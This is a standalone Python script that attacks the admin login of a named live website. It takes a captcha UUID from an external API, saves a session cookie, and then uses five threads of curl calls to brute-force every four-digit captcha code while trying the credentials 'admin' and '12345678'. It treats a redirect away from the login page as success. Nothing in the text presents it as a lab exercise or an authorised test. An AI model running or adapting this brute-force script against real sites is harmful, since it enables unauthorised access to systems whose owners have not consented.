import subprocess, json, threading

r = subprocess.run(['curl','-sk','https://api.myxypt.com/captcha?width=140&height=48'],
    capture_output=True,text=True,timeout=10)
uuid = json.loads(r.stdout)['data']['uuid']
subprocess.run(['curl','-sk','-c','/tmp/cn_final2.txt','http://chinanaisi.com/admin/login','-o','/dev/null'],timeout=5)
print('UUID:', uuid)

found = threading.Event()
result = [None]

def brute(start, end):
    for i in range(start, end):
        if found.is_set():
            return
        code = '%04d' % i
        try:
            r = subprocess.run(['curl','-sk','--connect-timeout','2','--max-time','3',
                '-b','/tmp/cn_final2.txt',
                'http://chinanaisi.com/admin/login.php','-X','POST',
                '-d','action=loginpost&uuid='+uuid+'&loginId=&username=admin&password=12345678&checkcode='+code,
                '-H','X-Requested-With: XMLHttpRequest','-A','Mozilla/5.0','-D','-','-o','/dev/null'],
                capture_output=True,text=True,timeout=5)
        except:
            continue
        loc = [l for l in r.stdout.split(chr(10)) if 'Location:' in l]
        if not loc or '/admin/login.php' not in str(loc):
            result[0] = code
            found.set()
            return

threads = []
for t in range(5):
    th = threading.Thread(target=brute, args=(t*2000, (t+1)*2000))
    th.start()
    threads.append(th)

for th in threads:
    th.join(20)

if result[0]:
    print('CODE=' + result[0])
else:
    print('TIMEOUT')
